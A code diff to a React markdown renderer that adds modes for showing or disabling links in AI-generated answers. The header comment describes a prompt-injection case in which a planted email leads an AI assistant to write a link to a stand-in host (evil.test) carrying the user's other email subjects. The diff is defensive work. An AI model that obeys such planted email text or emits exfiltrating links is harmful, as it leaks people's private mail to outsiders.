@@ -12,6 +12,16 @@
  * block carries its own classes, because the product's reset strips list
  * bullets, heading sizes and paragraph spacing. A link only renders for an
  * http(s), mailto or same-site address; anything else prints its text.
+ *
+ * AN AI ANSWER'S LINKS SHOW WHERE THEY GO (review round 3 of Phase 3). A
+ * planted email a teammate read could ask for "[Open the invoice](https://
+ * evil.test/i?d=<the other emails' subjects>)": one click on innocent words
+ * sent the person's mail to an outsider. The teammate and Ask AI threads
+ * pass `links`: "shown" makes the visible text of an outside link its whole
+ * address (the words, when they differ, stay beside it as plain text), and
+ * "inert" (an answer that read the person's Google, meta.readGoogle) links
+ * nothing at all, printing the words and the whole address as plain text.
+ * Left out, links render as before.
  */
 
 type Inline = string | React.ReactElement;
@@ -23,7 +33,32 @@ function safeHref(url: string): string | null {
   return null;
 }
 
-function renderInline(text: string, keyPrefix: string): Inline[] {
+/** How a markdown link renders (see the header): as before, with its address shown, or as plain text. */
+export type LinkMode = "plain" | "shown" | "inert";
+
+/**
+ * What one markdown link shows. `href` null: plain text only, `text` all of
+ * it; an inert link also names its `address` (and its `words` when they
+ * differ), so the address can be set apart. Otherwise a link whose own
+ * visible text is `text`, with `words` (when set) printed as plain text
+ * before it. Pure, so the rule is tested on its own.
+ */
+export type LinkShown =
+  | { href: null; text: string; words?: string | null; address?: string }
+  | { href: string; text: string; words: string | null; internal: boolean };
+
+export function linkShown(words: string, url: string, mode: LinkMode = "plain"): LinkShown {
+  const href = safeHref(url);
+  if (!href) return { href: null, text: words };
+  const internal = href.startsWith("/");
+  const same = words.trim() === href;
+  if (mode === "inert") return { href: null, text: same ? href : `${words} (${href})`, words: same ? null : words, address: href };
+  // A page of this app stays a link on its words: it never leaves WorkwrK.
+  if (mode === "plain" || internal) return { href, text: words, words: null, internal };
+  return { href, text: href, words: same ? null : words, internal };
+}
+
+function renderInline(text: string, keyPrefix: string, mode: LinkMode = "plain"): Inline[] {
   const out: Inline[] = [];
   // tokenize `code`, **bold**, *italic*, [text](url), left to right
   const re = /(`[^`\n]+`)|(\*\*[^*\n]+\*\*)|(\*[^*\n]+\*)|(\[[^\]]+\]\([^)]+\))/g;
@@ -42,21 +77,27 @@ function renderInline(text: string, keyPrefix: string): Inline[] {
       out.push(<em key={key}>{tok.slice(1, -1)}</em>);
     } else if (tok.startsWith("[")) {
       const linkMatch = /^\[([^\]]+)\]\(([^)]+)\)$/.exec(tok);
-      const href = linkMatch ? safeHref(linkMatch[2]) : null;
-      if (linkMatch && href) {
-        const internal = href.startsWith("/");
+      const shown = linkMatch ? linkShown(linkMatch[1], linkMatch[2], mode) : null;
+      if (shown && shown.href !== null) {
+        if (shown.words) out.push(`${shown.words} (`);
         out.push(
           <a
             key={key}
-            href={href}
-            className="font-medium text-brand-deep underline-offset-2 hover:underline"
-            {...(internal ? {} : { target: "_blank", rel: "noopener noreferrer" })}
+            href={shown.href}
+            className={`font-medium text-brand-deep underline-offset-2 hover:underline${shown.text === shown.href ? " break-all" : ""}`}
+            {...(shown.internal ? {} : { target: "_blank", rel: "noopener noreferrer" })}
           >
-            {linkMatch[1]}
+            {shown.text}
           </a>,
         );
+        if (shown.words) out.push(")");
+      } else if (shown?.address) {
+        // Inert: the whole address in plain sight, and nothing to click.
+        if (shown.words) out.push(`${shown.words} (`);
+        out.push(<span key={key} className="break-all">{shown.address}</span>);
+        if (shown.words) out.push(")");
       } else {
-        out.push(linkMatch ? linkMatch[1] : tok);
+        out.push(shown ? shown.text : tok);
       }
     }
     lastIndex = re.lastIndex;
@@ -120,7 +161,7 @@ const HEADING_CLASS: Record<number, string> = {
 };
 const HEADING_SMALL = "mt-3 mb-1.5 text-base font-semibold text-ink first:mt-0";
 
-export function OsMarkdown({ text }: { text: string }) {
+export function OsMarkdown({ text, links = "plain" }: { text: string; links?: LinkMode }) {
   if (!text) return null;
   const lines = text.replace(/\r\n?/g, "\n").split("\n");
   const blocks: React.ReactElement[] = [];
@@ -162,7 +203,7 @@ export function OsMarkdown({ text }: { text: string }) {
       const key = `b${bi++}`;
       blocks.push(
         <Tag key={key} className={HEADING_CLASS[level] ?? HEADING_SMALL}>
-          {renderInline(h[2].replace(/\s+#+\s*$/, ""), key)}
+          {renderInline(h[2].replace(/\s+#+\s*$/, ""), key, links)}
         </Tag>,
       );
       i++;
@@ -188,7 +229,7 @@ export function OsMarkdown({ text }: { text: string }) {
               <tr>
                 {Array.from({ length: cols }, (_, c) => (
                   <th key={c} scope="col" style={aligns[c] ? { textAlign: aligns[c] } : undefined} className="border-b border-line px-3 py-2 text-start font-medium text-ink-2">
-                    {renderInline(head[c] ?? "", `${key}-h${c}`)}
+                    {renderInline(head[c] ?? "", `${key}-h${c}`, links)}
                   </th>
                 ))}
               </tr>
@@ -198,7 +239,7 @@ export function OsMarkdown({ text }: { text: string }) {
                 <tr key={r} className="border-b border-line-soft last:border-b-0">
                   {Array.from({ length: cols }, (_, c) => (
                     <td key={c} style={aligns[c] ? { textAlign: aligns[c] } : undefined} className="px-3 py-2 align-top text-ink">
-                      {renderInline(row[c] ?? "", `${key}-${r}-${c}`)}
+                      {renderInline(row[c] ?? "", `${key}-${r}-${c}`, links)}
                     </td>
                   ))}
                 </tr>
@@ -220,7 +261,7 @@ export function OsMarkdown({ text }: { text: string }) {
       const key = `b${bi++}`;
       blocks.push(
         <blockquote key={key} className="my-2 border-s-2 border-line-strong ps-3 text-ink-2">
-          {renderInline(buf.join(" "), key)}
+          {renderInline(buf.join(" "), key, links)}
         </blockquote>,
       );
       continue;
@@ -236,7 +277,7 @@ export function OsMarkdown({ text }: { text: string }) {
       const key = `b${bi++}`;
       blocks.push(
         <ul key={key} className="my-2 list-disc ps-5">
-          {items.map((it, j) => <li key={j} className="my-0.5">{renderInline(it, `${key}-${j}`)}</li>)}
+          {items.map((it, j) => <li key={j} className="my-0.5">{renderInline(it, `${key}-${j}`, links)}</li>)}
         </ul>,
       );
       continue;
@@ -252,7 +293,7 @@ export function OsMarkdown({ text }: { text: string }) {
       const key = `b${bi++}`;
       blocks.push(
         <ol key={key} className="my-2 list-decimal ps-5">
-          {items.map((it, j) => <li key={j} className="my-0.5">{renderInline(it, `${key}-${j}`)}</li>)}
+          {items.map((it, j) => <li key={j} className="my-0.5">{renderInline(it, `${key}-${j}`, links)}</li>)}
         </ol>,
       );
       continue;
@@ -272,7 +313,7 @@ export function OsMarkdown({ text }: { text: string }) {
       i++;
     }
     const key = `b${bi++}`;
-    blocks.push(<p key={key} className="my-2 first:mt-0 last:mb-0">{renderInline(paraLines.join(" "), key)}</p>);
+    blocks.push(<p key={key} className="my-2 first:mt-0 last:mb-0">{renderInline(paraLines.join(" "), key, links)}</p>);
   }
 
   return <>{blocks}</>;
